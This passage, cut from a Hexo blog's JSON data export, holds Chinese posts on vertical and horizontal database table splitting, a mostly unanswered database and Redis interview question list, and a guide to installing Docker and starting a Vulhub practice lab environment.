class=\"number\">256</span>)</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)<span class=\"keyword\">engine</span>=<span class=\"keyword\">innodb</span> <span class=\"keyword\">charset</span>=utf8;</span><br></pre></td></tr></table></figure></p>\n<p><strong>水平拆分</strong>是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是：<br>    （1）每个库（表）的结构都一样<br>    （2）每个库（表）的数据不一样，没有交集<br>    （3）所有库（表）的并集是全量数据</p>\n<p><strong>垂直拆分</strong>是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是：<br>    （1）每个库（表）的结构都不一样<br>    （2）一般来说每个库（表）的属性至少有一列交集，一般是主键<br>    （3）所有库（表）的数据并集是全量数据</p>\n<p>以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> user_base(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">name</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">50</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\tage <span class=\"built_in\">int</span>,</span><br><span class=\"line\">\tsex tinyint,</span><br><span class=\"line\">\temail <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> user_ext(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">sign</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">64</span>),</span><br><span class=\"line\">\tintro <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>),</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。</p>\n<h3 id=\"二、垂直拆分的依据是什么\"><a href=\"#二、垂直拆分的依据是什么\" class=\"headerlink\" title=\"二、垂直拆分的依据是什么\"></a>二、垂直拆分的依据是什么</h3><p>那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：<br>（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表<br>（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表<br>（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里</p>\n<p>优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。</p>\n<p>一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，<strong>当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。</strong></p>\n<p>原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。<br>（1）join更消耗数据库性能<br>（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。</p>\n<h3 id=\"三、为什么要这样拆分\"><a href=\"#三、为什么要这样拆分\" class=\"headerlink\" title=\"三、为什么要这样拆分\"></a>三、为什么要这样拆分</h3><p>为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：<br>（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里<br>（2）内存buffer缓存数据是以row为单位的<br>（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据<br>（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO</p>\n<p>还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：<br>（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据<br>（2）user_ext访问频率低，一行大小0.9k<br>拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。</p>\n<h3 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h3><p>1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段<br>2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性<br>3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"数据库面试题","date":"2018-11-02T03:19:47.000Z","_content":"\n#### 1、SQL优化的常见方法\n\n#### 2、SQL索引的顺序、字段的顺序\n\n#### 3、查看SQL索引\n\n#### 4、Mysql分页查询语句\n\n\n#### 5、Mysql的事物特性和隔离级别\n- 事务特性(ACID)\n\t- 原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。\n\t- 一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态\n\t- 隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。\n\t- 持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中\n- 隔离级别：\n\t- 读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读\n\t- 读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读\n\t- 可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读\n\t- 序列化读(Serializble)：串行化顺序执行\n\t大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。\n\n#### 6、sql having的使用场景\n\n#### 7、Mysql数据库的索引及原理\n\n#### 8、锁机制介绍：行锁、表锁、排它锁、共享锁\n\n#### 9、乐观锁的业务场景和实现方式\n\n#### 10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交\n\n#### 11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\n\n#### 12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\n\n#### 13、SQL的整个解析过程、执行过程原理、SQL行转列\n\n#### 14、Redis为什么这么快，Redis采用多线程会有那些问题\n\n#### 15、Redis支持那些数据结构\nString 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合\n\n#### 16、Redsi跳表的问题\n\n#### 17、Redsi单进程单线程如何能够高并发\n\n#### 18、如何使用Redis实现分布式锁\n\n#### 19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/数据库面试题.md","raw":"---\ntitle: 数据库面试题\ndate: 2018-11-02 11:19:47\ntags:\ncategories:\n---\n\n#### 1、SQL优化的常见方法\n\n#### 2、SQL索引的顺序、字段的顺序\n\n#### 3、查看SQL索引\n\n#### 4、Mysql分页查询语句\n\n\n#### 5、Mysql的事物特性和隔离级别\n- 事务特性(ACID)\n\t- 原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。\n\t- 一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态\n\t- 隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。\n\t- 持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中\n- 隔离级别：\n\t- 读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读\n\t- 读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读\n\t- 可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读\n\t- 序列化读(Serializble)：串行化顺序执行\n\t大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。\n\n#### 6、sql having的使用场景\n\n#### 7、Mysql数据库的索引及原理\n\n#### 8、锁机制介绍：行锁、表锁、排它锁、共享锁\n\n#### 9、乐观锁的业务场景和实现方式\n\n#### 10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交\n\n#### 11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\n\n#### 12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\n\n#### 13、SQL的整个解析过程、执行过程原理、SQL行转列\n\n#### 14、Redis为什么这么快，Redis采用多线程会有那些问题\n\n#### 15、Redis支持那些数据结构\nString 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合\n\n#### 16、Redsi跳表的问题\n\n#### 17、Redsi单进程单线程如何能够高并发\n\n#### 18、如何使用Redis实现分布式锁\n\n#### 19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"数据库面试题","published":1,"updated":"2018-12-03T09:55:52.655Z","_id":"cjpdmv00c000l4cv0p48sgfwq","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1、SQL优化的常见方法\"><a href=\"#1、SQL优化的常见方法\" class=\"headerlink\" title=\"1、SQL优化的常见方法\"></a>1、SQL优化的常见方法</h4><h4 id=\"2、SQL索引的顺序、字段的顺序\"><a href=\"#2、SQL索引的顺序、字段的顺序\" class=\"headerlink\" title=\"2、SQL索引的顺序、字段的顺序\"></a>2、SQL索引的顺序、字段的顺序</h4><h4 id=\"3、查看SQL索引\"><a href=\"#3、查看SQL索引\" class=\"headerlink\" title=\"3、查看SQL索引\"></a>3、查看SQL索引</h4><h4 id=\"4、Mysql分页查询语句\"><a href=\"#4、Mysql分页查询语句\" class=\"headerlink\" title=\"4、Mysql分页查询语句\"></a>4、Mysql分页查询语句</h4><h4 id=\"5、Mysql的事物特性和隔离级别\"><a href=\"#5、Mysql的事物特性和隔离级别\" class=\"headerlink\" title=\"5、Mysql的事物特性和隔离级别\"></a>5、Mysql的事物特性和隔离级别</h4><ul>\n<li>事务特性(ACID)<ul>\n<li>原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。</li>\n<li>一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态</li>\n<li>隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。</li>\n<li>持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中</li>\n</ul>\n</li>\n<li>隔离级别：<ul>\n<li>读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读</li>\n<li>读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读</li>\n<li>可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读</li>\n<li>序列化读(Serializble)：串行化顺序执行<br>大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"6、sql-having的使用场景\"><a href=\"#6、sql-having的使用场景\" class=\"headerlink\" title=\"6、sql having的使用场景\"></a>6、sql having的使用场景</h4><h4 id=\"7、Mysql数据库的索引及原理\"><a href=\"#7、Mysql数据库的索引及原理\" class=\"headerlink\" title=\"7、Mysql数据库的索引及原理\"></a>7、Mysql数据库的索引及原理</h4><h4 id=\"8、锁机制介绍：行锁、表锁、排它锁、共享锁\"><a href=\"#8、锁机制介绍：行锁、表锁、排它锁、共享锁\" class=\"headerlink\" title=\"8、锁机制介绍：行锁、表锁、排它锁、共享锁\"></a>8、锁机制介绍：行锁、表锁、排它锁、共享锁</h4><h4 id=\"9、乐观锁的业务场景和实现方式\"><a href=\"#9、乐观锁的业务场景和实现方式\" class=\"headerlink\" title=\"9、乐观锁的业务场景和实现方式\"></a>9、乐观锁的业务场景和实现方式</h4><h4 id=\"10、事务介绍、分布式事务的理解，常见的解决方案有哪些？-什么是两阶段提交、三阶段提交\"><a href=\"#10、事务介绍、分布式事务的理解，常见的解决方案有哪些？-什么是两阶段提交、三阶段提交\" class=\"headerlink\" title=\"10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交\"></a>10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交</h4><h4 id=\"11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\"><a href=\"#11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\" class=\"headerlink\" title=\"11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\"></a>11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么</h4><h4 id=\"12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\"><a href=\"#12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\" class=\"headerlink\" title=\"12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\"></a>12、JDBC如何实现事务、嵌套事务实现、分布式事务实现</h4><h4 id=\"13、SQL的整个解析过程、执行过程原理、SQL行转列\"><a href=\"#13、SQL的整个解析过程、执行过程原理、SQL行转列\" class=\"headerlink\" title=\"13、SQL的整个解析过程、执行过程原理、SQL行转列\"></a>13、SQL的整个解析过程、执行过程原理、SQL行转列</h4><h4 id=\"14、Redis为什么这么快，Redis采用多线程会有那些问题\"><a href=\"#14、Redis为什么这么快，Redis采用多线程会有那些问题\" class=\"headerlink\" title=\"14、Redis为什么这么快，Redis采用多线程会有那些问题\"></a>14、Redis为什么这么快，Redis采用多线程会有那些问题</h4><h4 id=\"15、Redis支持那些数据结构\"><a href=\"#15、Redis支持那些数据结构\" class=\"headerlink\" title=\"15、Redis支持那些数据结构\"></a>15、Redis支持那些数据结构</h4><p>String 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合</p>\n<h4 id=\"16、Redsi跳表的问题\"><a href=\"#16、Redsi跳表的问题\" class=\"headerlink\" title=\"16、Redsi跳表的问题\"></a>16、Redsi跳表的问题</h4><h4 id=\"17、Redsi单进程单线程如何能够高并发\"><a href=\"#17、Redsi单进程单线程如何能够高并发\" class=\"headerlink\" title=\"17、Redsi单进程单线程如何能够高并发\"></a>17、Redsi单进程单线程如何能够高并发</h4><h4 id=\"18、如何使用Redis实现分布式锁\"><a href=\"#18、如何使用Redis实现分布式锁\" class=\"headerlink\" title=\"18、如何使用Redis实现分布式锁\"></a>18、如何使用Redis实现分布式锁</h4><h4 id=\"19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\"><a href=\"#19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\" class=\"headerlink\" title=\"19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\"></a>19、Redis分布式锁操作的原子性，Redsi内部是如何实现的</h4><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1、SQL优化的常见方法\"><a href=\"#1、SQL优化的常见方法\" class=\"headerlink\" title=\"1、SQL优化的常见方法\"></a>1、SQL优化的常见方法</h4><h4 id=\"2、SQL索引的顺序、字段的顺序\"><a href=\"#2、SQL索引的顺序、字段的顺序\" class=\"headerlink\" title=\"2、SQL索引的顺序、字段的顺序\"></a>2、SQL索引的顺序、字段的顺序</h4><h4 id=\"3、查看SQL索引\"><a href=\"#3、查看SQL索引\" class=\"headerlink\" title=\"3、查看SQL索引\"></a>3、查看SQL索引</h4><h4 id=\"4、Mysql分页查询语句\"><a href=\"#4、Mysql分页查询语句\" class=\"headerlink\" title=\"4、Mysql分页查询语句\"></a>4、Mysql分页查询语句</h4><h4 id=\"5、Mysql的事物特性和隔离级别\"><a href=\"#5、Mysql的事物特性和隔离级别\" class=\"headerlink\" title=\"5、Mysql的事物特性和隔离级别\"></a>5、Mysql的事物特性和隔离级别</h4><ul>\n<li>事务特性(ACID)<ul>\n<li>原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。</li>\n<li>一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态</li>\n<li>隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。</li>\n<li>持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中</li>\n</ul>\n</li>\n<li>隔离级别：<ul>\n<li>读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读</li>\n<li>读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读</li>\n<li>可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读</li>\n<li>序列化读(Serializble)：串行化顺序执行<br>大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"6、sql-having的使用场景\"><a href=\"#6、sql-having的使用场景\" class=\"headerlink\" title=\"6、sql having的使用场景\"></a>6、sql having的使用场景</h4><h4 id=\"7、Mysql数据库的索引及原理\"><a href=\"#7、Mysql数据库的索引及原理\" class=\"headerlink\" title=\"7、Mysql数据库的索引及原理\"></a>7、Mysql数据库的索引及原理</h4><h4 id=\"8、锁机制介绍：行锁、表锁、排它锁、共享锁\"><a href=\"#8、锁机制介绍：行锁、表锁、排它锁、共享锁\" class=\"headerlink\" title=\"8、锁机制介绍：行锁、表锁、排它锁、共享锁\"></a>8、锁机制介绍：行锁、表锁、排它锁、共享锁</h4><h4 id=\"9、乐观锁的业务场景和实现方式\"><a href=\"#9、乐观锁的业务场景和实现方式\" class=\"headerlink\" title=\"9、乐观锁的业务场景和实现方式\"></a>9、乐观锁的业务场景和实现方式</h4><h4 id=\"10、事务介绍、分布式事务的理解，常见的解决方案有哪些？-什么是两阶段提交、三阶段提交\"><a href=\"#10、事务介绍、分布式事务的理解，常见的解决方案有哪些？-什么是两阶段提交、三阶段提交\" class=\"headerlink\" title=\"10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交\"></a>10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交</h4><h4 id=\"11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\"><a href=\"#11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\" class=\"headerlink\" title=\"11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\"></a>11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么</h4><h4 id=\"12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\"><a href=\"#12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\" class=\"headerlink\" title=\"12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\"></a>12、JDBC如何实现事务、嵌套事务实现、分布式事务实现</h4><h4 id=\"13、SQL的整个解析过程、执行过程原理、SQL行转列\"><a href=\"#13、SQL的整个解析过程、执行过程原理、SQL行转列\" class=\"headerlink\" title=\"13、SQL的整个解析过程、执行过程原理、SQL行转列\"></a>13、SQL的整个解析过程、执行过程原理、SQL行转列</h4><h4 id=\"14、Redis为什么这么快，Redis采用多线程会有那些问题\"><a href=\"#14、Redis为什么这么快，Redis采用多线程会有那些问题\" class=\"headerlink\" title=\"14、Redis为什么这么快，Redis采用多线程会有那些问题\"></a>14、Redis为什么这么快，Redis采用多线程会有那些问题</h4><h4 id=\"15、Redis支持那些数据结构\"><a href=\"#15、Redis支持那些数据结构\" class=\"headerlink\" title=\"15、Redis支持那些数据结构\"></a>15、Redis支持那些数据结构</h4><p>String 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合</p>\n<h4 id=\"16、Redsi跳表的问题\"><a href=\"#16、Redsi跳表的问题\" class=\"headerlink\" title=\"16、Redsi跳表的问题\"></a>16、Redsi跳表的问题</h4><h4 id=\"17、Redsi单进程单线程如何能够高并发\"><a href=\"#17、Redsi单进程单线程如何能够高并发\" class=\"headerlink\" title=\"17、Redsi单进程单线程如何能够高并发\"></a>17、Redsi单进程单线程如何能够高并发</h4><h4 id=\"18、如何使用Redis实现分布式锁\"><a href=\"#18、如何使用Redis实现分布式锁\" class=\"headerlink\" title=\"18、如何使用Redis实现分布式锁\"></a>18、如何使用Redis实现分布式锁</h4><h4 id=\"19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\"><a href=\"#19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\" class=\"headerlink\" title=\"19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\"></a>19、Redis分布式锁操作的原子性，Redsi内部是如何实现的</h4><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"漏洞靶场Vulhub使用","date":"2018-11-01T09:36:18.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\nVulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 安装\n{% endnote %}\n</div>\n\n我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装\n\n```bash\n# 安装git\nyum install git\n# 安装docker并启动docker\nyum install docker && systemctl start docker\n# 安装docker-compose\nyum install docker-compose\n```\n\n由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。\n\ndocker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行`docker-compose up -d`即可启动容器环境。\n\n安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录\n\n```bash\ngit clone https://github.com/vulhub/vulhub.git\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 启动漏洞环境\n{% endnote %}\n</div>\n\ndocker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。\n\n在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入`flask/ssti`目录，执行如下命令，进行漏洞靶场的编译和运行：\n```bash\ncd flask/ssti\ndocker-compose build\ndocker-compose up -d\n```\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/漏洞靶场Vulhub使用.md","raw":"---\ntitle: 漏洞靶场Vulhub使用\ndate: 2018-11-01 17:36:18\ntags:\ncategories:\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\nVulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 安装\n{% endnote %}\n</div>\n\n我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装\n\n```bash\n# 安装git\nyum install git\n# 安装docker并启动docker\nyum install docker && systemctl start docker\n# 安装docker-compose\nyum install docker-compose\n```\n\n由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。\n\ndocker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行`docker-compose up -d`即可启动容器环境。\n\n安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录\n\n```bash\ngit clone https://github.com/vulhub/vulhub.git\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 启动漏洞环境\n{% endnote %}\n</div>\n\ndocker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。\n\n在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入`flask/ssti`目录，执行如下命令，进行漏洞靶场的编译和运行：\n```bash\ncd flask/ssti\ndocker-compose build\ndocker-compose up -d\n```\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"漏洞靶场Vulhub使用","published":1,"updated":"2018-11-29T09:59:50.697Z","_id":"cjpdmv00g000n4cv08o31om83","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>Vulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3></div><br></div>\n\n<p>我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装git</span></span><br><span class=\"line\">yum install git</span><br><span class=\"line\"><span class=\"comment\"># 安装docker并启动docker</span></span><br><span class=\"line\">yum install docker &amp;&amp; systemctl start docker</span><br><span class=\"line\"><span class=\"comment\"># 安装docker-compose</span></span><br><span class=\"line\">yum install docker-compose</span><br></pre></td></tr></table></figure>\n<p>由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。</p>\n<p>docker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行<code>docker-compose up -d</code>即可启动容器环境。</p>\n<p>安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> 